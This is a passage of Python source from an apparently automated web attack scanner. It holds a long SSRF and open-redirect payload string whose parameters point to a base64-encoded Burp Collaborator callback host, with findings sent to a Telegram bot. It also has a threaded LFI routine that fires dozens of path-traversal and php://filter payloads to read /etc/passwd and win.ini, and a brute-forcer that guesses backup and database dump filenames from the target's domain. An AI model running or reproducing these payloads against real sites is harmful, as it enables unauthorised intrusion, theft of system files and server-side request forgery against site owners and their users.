    "?Page=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&_url=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&callback=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&checkout_url=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&content=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&continue=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&continueTo=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&counturl=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&data=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&dest=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&dest_url=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&dir=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&document=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&domain=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&done=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&download=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&feed=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&file=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&host=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&html=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&http=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&https=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&image=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&image_src=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&image_url=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&imageurl=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&include=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&langTo=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&media=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&navigation=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&next=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&open=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&out=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&page=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&page_url=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&pageurl=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&path=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&picture=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&port=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&proxy=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&redir=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&redirect=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&redirectUri=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&redirectUrl=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&reference=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&referrer=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&req=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&request=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&retUrl=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&return=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&returnTo=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&return_path=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&return_to=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&rurl=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&show=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&site=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&source=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&src=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&target=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&to=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&uri=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&url=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&val=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&validate=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&view=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&window=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA==&redirect_to=aHR0cDovL29tZWcwaXZuN2s5NXdsb3llemFoN3pjcWdobTdhdy5idXJwY29sbGFib3JhdG9yLm5ldA=="
    ]
    if  rootdomain(i) == True:
        pass
    else:
        i=i+'/' 


    for x in lis2:
        x=x.rstrip()
        url=i+x
        user_agent=random.choice(USR_AGENTS)
        headers = {'User-Agent': user_agent }
        try:
            r = requests.get(url,headers=headers,verify=False)
            
            cont=r.content
            if 'k6unx4pudf8k5itoapaxjwzjigz' in str(cont):
                if r.history :
                    print('\033[91m Possibly open redirection vulnerability\033[00m '+url) 
                    msg="Possibly open redrection vulnerability "+url
                    bot.telegram_bot_sendtext(msg)   
                else:
                    print('\033[91m Possibly SSRF vulnerability\033[00m '+url) 
                    msg="Possibly SSRF vulnerability "+url
                    bot.telegram_bot_sendtext(msg) 

        except :
            pass

                           
                                          
                            
        
        

def lfi_(i):
    if  rootdomain(i) == True:
        pass
    else:
        i=i+'/' 
    ul=i
    pay=["?q=../../../etc/passwd&s=../../../etc/passwd&search=../../../etc/passwd&id=&action=../../../etc/passwd&keyword=../../../etc/passwd&query=../../../etc/passwd&page=../../../etc/passwd&keywords=../../../etc/passwd&url=../../../etc/passwd&view=../../../etc/passwd&cat=../../../etc/passwd&name=../../../etc/passwd&key=../../../etc/passwd&p=../../../etc/passwd",
"?q=../../../etc/passwd%00&s=../../../etc/passwd%00&search=../../../etc/passwd%00&id=../../../etc/passwd%00&action=../../../etc/passwd%00&keyword=../../../etc/passwd%00&query=../../../etc/passwd%00&page=../../../etc/passwd%00&keywords=../../../etc/passwd%00&url=../../../etc/passwd%00&view=../../../etc/passwd%00&cat=../../../etc/passwd%00&name=../../../etc/passwd%00&key=../../../etc/passwd%00&p=../../../etc/passwd%00",
"?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd",
"?q=%252e%252e%252fetc%252fpasswd%00&s=%252e%252e%252fetc%252fpasswd%00&search=%252e%252e%252fetc%252fpasswd%00&id=%252e%252e%252fetc%252fpasswd%00&action=%252e%252e%252fetc%252fpasswd%00&keyword=%252e%252e%252fetc%252fpasswd%00&query=%252e%252e%252fetc%252fpasswd%00&page=%252e%252e%252fetc%252fpasswd%00&keywords=%252e%252e%252fetc%252fpasswd%00&url=%252e%252e%252fetc%252fpasswd%00&view=%252e%252e%252fetc%252fpasswd%00&cat=%252e%252e%252fetc%252fpasswd%00&name=%252e%252e%252fetc%252fpasswd%00&key=%252e%252e%252fetc%252fpasswd%00&p=%252e%252e%252fetc%252fpasswd%00",
"?q=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&s=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&search=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&id=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&action=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keyword=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&query=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&keywords=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&url=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&cat=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&name=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&key=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd&p=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
"?q=....//....//etc/passwd&s=....//....//etc/passwd&search=....//....//etc/passwd&id=....//....//etc/passwd&action=....//....//etc/passwd&keyword=....//....//etc/passwd&query=....//....//etc/passwd&page=....//....//etc/passwd&keywords=....//....//etc/passwd&url=....//....//etc/passwd&view=....//....//etc/passwd&cat=....//....//etc/passwd&name=....//....//etc/passwd&key=....//....//etc/passwd&p=....//....//etc/passwd",
"?q=..///////..////..//////etc/passwd&s=..///////..////..//////etc/passwd&search=..///////..////..//////etc/passwd&id=..///////..////..//////etc/passwd&action=..///////..////..//////etc/passwd&keyword=..///////..////..//////etc/passwd&query=..///////..////..//////etc/passwd&page=..///////..////..//////etc/passwd&keywords=..///////..////..//////etc/passwd&url=..///////..////..//////etc/passwd&view=..///////..////..//////etc/passwd&cat=..///////..////..//////etc/passwd&name=..///////..////..//////etc/passwd&key=..///////..////..//////etc/passwd&p=..///////..////..//////etc/passwd",
"?q=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&s=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&search=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&id=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&action=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keyword=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&query=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&keywords=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&url=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&view=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&cat=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&name=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&key=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd&p=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
"?q=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&s=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&search=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&id=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&action=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keyword=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&query=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&keywords=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&url=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&view=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&cat=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&name=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&key=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd&p=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
"?url=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
"?redirect=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
"?page=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
"?redirect=..%2f..%2f..%2f..%2fwindows/win.ini",
"?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
"?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini",
"/../../../etc/passwd",
"/../../../etc/passwd%00"
"%252e%252e%252fetc%252fpasswd",
"%252e%252e%252fetc%252fpasswd%00",
"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
"/....//....//etc/passwd",
"/..///////..////..//////etc/passwd",
"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd",
"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
"/../../../windows/win.ini",
"/../../../windows/win.ini%00"
"%252e%252e%252fetc%252fpasswd",
"%252e%252e%252fetc%252fpasswd%00",
"%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
"/....//....//windows/win.ini",
"/..///////..////..//////windows/win.ini",
"/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini",
"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini",
"?q=../../../windows/win.ini&s=../../../windows/win.ini&search=../../../windows/win.ini&id=&action=../../../windows/win.ini&keyword=../../../windows/win.ini&query=../../../windows/win.ini&page=../../../windows/win.ini&keywords=../../../windows/win.ini&url=../../../windows/win.ini&view=../../../windows/win.ini&cat=../../../windows/win.ini&name=../../../windows/win.ini&key=../../../windows/win.ini&p=../../../windows/win.ini",
"?q=../../../windows/win.ini%00&s=../../../windows/win.ini%00&search=../../../windows/win.ini%00&id=../../../windows/win.ini%00&action=../../../windows/win.ini%00&keyword=../../../windows/win.ini%00&query=../../../windows/win.ini%00&page=../../../windows/win.ini%00&keywords=../../../windows/win.ini%00&url=../../../windows/win.ini%00&view=../../../windows/win.ini%00&cat=../../../windows/win.ini%00&name=../../../windows/win.ini%00&key=../../../windows/win.ini%00&p=../../../windows/win.ini%00",
"?q=%252e%252e%252fetc%252fpasswd&s=%252e%252e%252fetc%252fpasswd&search=%252e%252e%252fetc%252fpasswd&id=%252e%252e%252fetc%252fpasswd&action=%252e%252e%252fetc%252fpasswd&keyword=%252e%252e%252fetc%252fpasswd&query=%252e%252e%252fetc%252fpasswd&page=%252e%252e%252fetc%252fpasswd&keywords=%252e%252e%252fetc%252fpasswd&url=%252e%252e%252fetc%252fpasswd&view=%252e%252e%252fetc%252fpasswd&cat=%252e%252e%252fetc%252fpasswd&name=%252e%252e%252fetc%252fpasswd&key=%252e%252e%252fetc%252fpasswd&p=%252e%252e%252fetc%252fpasswd",
"?q=%252e%252e%252fetc%252fpasswd%00&s=%252e%252e%252fetc%252fpasswd%00&search=%252e%252e%252fetc%252fpasswd%00&id=%252e%252e%252fetc%252fpasswd%00&action=%252e%252e%252fetc%252fpasswd%00&keyword=%252e%252e%252fetc%252fpasswd%00&query=%252e%252e%252fetc%252fpasswd%00&page=%252e%252e%252fetc%252fpasswd%00&keywords=%252e%252e%252fetc%252fpasswd%00&url=%252e%252e%252fetc%252fpasswd%00&view=%252e%252e%252fetc%252fpasswd%00&cat=%252e%252e%252fetc%252fpasswd%00&name=%252e%252e%252fetc%252fpasswd%00&key=%252e%252e%252fetc%252fpasswd%00&p=%252e%252e%252fetc%252fpasswd%00",
"?q=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&s=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&search=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&id=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&action=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&keyword=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&query=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&keywords=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&url=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&view=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&cat=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&name=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&key=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini&p=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini",
"?q=....//....//windows/win.ini&s=....//....//windows/win.ini&search=....//....//windows/win.ini&id=....//....//windows/win.ini&action=....//....//windows/win.ini&keyword=....//....//windows/win.ini&query=....//....//windows/win.ini&page=....//....//windows/win.ini&keywords=....//....//windows/win.ini&url=....//....//windows/win.ini&view=....//....//windows/win.ini&cat=....//....//windows/win.ini&name=....//....//windows/win.ini&key=....//....//windows/win.ini&p=....//....//windows/win.ini",
"?q=..///////..////..//////windows/win.ini&s=..///////..////..//////windows/win.ini&search=..///////..////..//////windows/win.ini&id=..///////..////..//////windows/win.ini&action=..///////..////..//////windows/win.ini&keyword=..///////..////..//////windows/win.ini&query=..///////..////..//////windows/win.ini&page=..///////..////..//////windows/win.ini&keywords=..///////..////..//////windows/win.ini&url=..///////..////..//////windows/win.ini&view=..///////..////..//////windows/win.ini&cat=..///////..////..//////windows/win.ini&name=..///////..////..//////windows/win.ini&key=..///////..////..//////windows/win.ini&p=..///////..////..//////windows/win.ini",
"?q=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&s=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&search=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&id=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&action=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&keyword=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&query=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&keywords=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&url=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&view=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&cat=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&name=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&key=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini&p=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../windows/win.ini",
"?q=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&s=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&search=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&id=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&action=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&keyword=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&query=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&page=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&keywords=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&url=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&view=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&cat=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&name=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&key=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini&p=php://filter/zlib.deflate/convert.base64-encode/resource=/windows/win.ini",

    ]
    rg1="root:[x*]:0:0:"
    rg2="\\[(font|extension|file)s\\]"
    word_queue = build_wordlist(pay)
    def explfi():
        while not word_queue.empty():
            attempt = word_queue.get()
            attempt_list = []
            attempt_list.append(attempt)
            for brute in attempt_list:
                url=str(ul)+str(brute) 
                
                try:
                    r = requests.get(url,verify=False)
                    scode=r.status_code
                    resp = r.content
                   
                    x1 = re.findall(rg1, str(resp))
                    x2 = re.findall(rg2, str(resp))
                    if (x1) or (x2):
                        print('\033[91mPossibly LFI vulnerability\033[00m  '+url)
                        
                except:
                    pass
                    
    for i in range(threads):
         t = threading.Thread(target=explfi,args=())
         t.start()
     
    
    
scodevar1=''       

def backupfile_(i):
    url=i
    filename=[]
    ext=['.tar','.rar','.zip','.tmp','.tar.gz','.sql.gz','.bak.sql','.bak.sql.gz', '.bak.sql.bz2','.bak.sql.tar.gz','.txt','.bak','.bak1','.bakup','.bakup1',  '.bkp','.save','.old','.orig','.original','.sql','.tpl','.tmp','.temp','.saved','.back','.bck','.bakup','.nsx','.cs','.csproj',
    '.vb','.0','.1','.2','.arc','.inc','.lst','.git/']
    urls=[]
    
    try:
        protocol=i.split(":")[0]
        baselink=i.split("/")[2]
        baselink=protocol+'://'+baselink
        #print(baselink)
        #urls.append(baselink)
        subdomainmame=i.split('/')[2]
        filename.append(subdomainmame)
        subdomnameMod1=subdomainmame.replace('.','_')
        filename.append(subdomnameMod1)
        subdomnameMod2=subdomainmame.replace('.','-')
        filename.append(subdomnameMod2)
        subdomnameMod3=subdomainmame.replace('.','')
        filename.append(subdomnameMod3)
        domainname_=rev(subdomainmame).split('.')[0]+'.'+rev(subdomainmame).split('.')[1]
        domainname=rev(domainname_)
        filename.append(domainname)
        domainnameMod1=domainname.replace('.','_')
        filename.append(domainnameMod1)
        domainnameMod2=domainname.replace('.','-')
        filename.append(domainnameMod2)
        domainnameMod3=domainname.replace('.','')
        filename.append(domainnameMod3)
        basename=domainname.split('.')[0]
        filename.append(basename)
    except:
        pass
    for x in filename:
        for p in ext:
            link1=i+'/'+x+p
            urls.append(link1)
    for b in  ext:
        link2=i+'/'+b
        urls.append(link2)
    
    
         
    
        
         
    word_queue = build_wordlist(urls)
    def expbf():
          try:
              testlink=url+'/.uniq_Str.zip'
              test_r = requests.head(testlink,verify=False)
              test_scode=test_r.status_code
          except:
              pass
          while not word_queue.empty():
            attempt = word_queue.get()
            attempt_list = []
            attempt_list.append(attempt)
            for brute in attempt_list:
                
                try:
                     r = requests.head(brute,verify=False)
                     scode=r.status_code
                    

